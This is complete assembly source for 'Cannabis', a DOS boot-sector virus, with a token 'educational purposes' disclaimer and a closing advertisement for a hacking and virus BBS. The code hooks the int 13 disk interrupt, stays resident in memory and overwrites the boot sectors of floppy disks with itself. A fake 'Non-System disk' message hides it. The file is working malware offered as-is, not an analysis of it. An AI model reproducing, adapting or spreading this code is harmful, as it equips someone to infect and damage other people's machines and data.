;****************************************************************************
;*  Cannabis    version 4
;*
;*  Compile with TASM 2.0
;*  (other assemblers will probably not produce the same result)
;*
;*  Disclaimer:
;*  This file is only for educational purposes. The author takes no
;*  responsibility for anything anyone does with this file. Do not
;*  modify this file!
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                .RADIX  16

BASE            equ     7C00

                org     0

begin:          jmp     start

                org     3

                db      'CANNABIS'              ;BIOS parameter block
                dw      0200
                db      2
                dw      1
                db      2
                dw      112d
                dw      720d
                db      0FDh
                dw      2
                dw      9
                dw      2
                dw      0

                org     3E

start:          cld                             ;initialise segments + stack
                cli
                xor     ax,ax
                mov     ss,ax
                mov     ds,ax
                mov     sp,7C00

                mov     bx,offset ni13+BASE     ;check int13 vector
                mov     ax,ds:[4*13]
                cmp     ax,bx
                je      installed

                mov     ds:[oi13+BASE],ax       ;save old vector
                mov     ax,ds:[4*13+2]
                mov     di,400
                mov     ds:[oi13+2+BASE],ax

                mov     ax,ds:[di+13]
                dec     ax
                mov     cl,6
                mov     ds:[di+13],ax

                shl     ax,cl
                sub     ax,07C0

                mov     cx,0200                 ;copy virus to top
                mov     di,sp
                mov     es,ax
                mov     si,sp
        rep     movsb

                mov     ds:[4*13+2],es          ;set new vector
                mov     ds:[4*13],bx

installed:      xor     ax,ax
                push    ss
                pop     es
                mov     bx,0078
                lds     si,ss:[bx]              ;ds:si = int 1E (=table ptr)
                push    ds
                push    si
                push    ss
                push    bx
                mov     cx,0bh
                mov     di,7C3Eh                ;move table -> ds:7C3E
        rep     movsb
                push    es
                pop     ds
                mov     cx,ds:[7C18]
                mov     byte ptr [di-2], 0fh
                mov     [bx+2],ax
                mov     [di-7],cl

                mov     word ptr [bx],7C3E
                sti
                int     13                      ;reset disk
                jc      error
                mov     cx,ds:[7C13]            ;number of sectors
                mov     ds:[7C20],cx
                mov     ax,ds:[7C16]            ;calculate root-entry (FAT)
                shl     ax,1
                inc     ax
                mov     ds:[7C49],ax            ;save value
                mov     ds:[7C50],ax

                mov     ax,ds:[7C11]            ;calculate IO.SYS entry
                mov     cl,4
                shr     ax,cl
                add     ds:[7C49],ax

                mov     ax,ds:[7C50]
                mov     bx,0500
                call    readsector
                jc      error
                cmp     word ptr [bx], 'OI'     ;IO.SYS ?
                jne     ibmtest
                cmp     word ptr [bx+20], 'SM'  ;MSDOS.SYS ?
                je      continue
                jmp     short error

ibmtest:        cmp     word ptr [bx], 'BI'     ;IBMBIO.COM ?
                jne     error
                cmp     word ptr [bx+20], 'BI'  ;IBMDOS.COM ?
                je      continue

error:          mov     si,offset errortxt+BASE   ;print error-message
                call    print
                xor     ax,ax
                int     16                      ;wait for keypress
                pop     si                      ;restore int 1E vector
                pop     ds
                pop     [si]
                pop     [si+2]
                int     19                      ;boot again...

continue:       mov     cx,3                    ;at ds:0700
                mov     bx,0700
                mov     ax,ds:[7C49]            

nextsec:        call    readsector
                jc      error
                add     bx,0200
                inc     ax
                loop    nextsec

                mov     dl,0
                mov     ch,ds:[7C15]            ;go to begin IO.SYS
                mov     bx,ds:[7C49]
                mov     ax,0
                db      0EA, 0, 0, 70, 0


;****************************************************************************
;*              Read a sector
;****************************************************************************

readsector:     push    cx
                push    ax

                div     byte ptr ds:[7C18]      ;al=sec/9 (0-160) ah=sec. (0-8)
                cwd
                inc     ah                      ;ah=1-9 (sector)
                shr     al,1                    ;al=0-80 (track)
                adc     dh,0                    ;dh=0/1 (head) dl=0 (drive)
                xchg    ah,al
                mov     cx,0201
                xchg    ax,cx
                int     13

                pop     ax
                pop     cx
return:         ret


;****************************************************************************
;*              Print message
;****************************************************************************

print:          lodsb
                or      al,al
                jz      return
                mov     ah,0Eh
                mov     bx,7
                int     10
                jmp     short print


;****************************************************************************
;*              Int 13 handler
;****************************************************************************

ni13:           push    ax
                push    ds
                cmp     ah,4                    ;funktion 0-4?
                ja      cancel
                cmp     ch,1
                ja      cancel
                test    dx,0FFFEh               ;drive A: or B: ? (head=0)
                jnz     cancel
                xor     ax,ax
                mov     ds,ax

infect:         push    cx
                push    bx
                push    di
                push    si
                push    es
                mov     ax,0201                 ;read bootsector at 7E00
                mov     bx,7E00
                mov     cx,1
                push    cs
                push    cs
                pop     ds
                pop     es
                pushf
                push    cs
                call    orgint13
                jc      exit

                mov     di,7C0Bh                ;move BPB to virus
                mov     cl,33
                mov     si,7E0Bh
        rep     movsb

                mov     ax,0301                 ;write virus to boot-sector
                mov     bx,7C00
                mov     cx,1
                pushf   
                push    cs
                call    orgint13

exit:           pop     es
                pop     si
                pop     di
                pop     bx
                pop     cx

cancel:         pop     ds
                pop     ax
orgint13:       jmp     dword ptr cs:[oi13+BASE]   ;original vector


;****************************************************************************
;*              Data
;****************************************************************************

oi13            dw      ?,?                     ;original int 13 vector

errortxt        db      0Dh, 0Ah, 'Non-System disk or disk error'
                db      0Dh, 0Ah, 'Replace and press a key when ready'
                db      0Dh, 0Ah, 0

        
                org     01FEh

                db      55, 0AA

cseg            ends
                end     begin

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
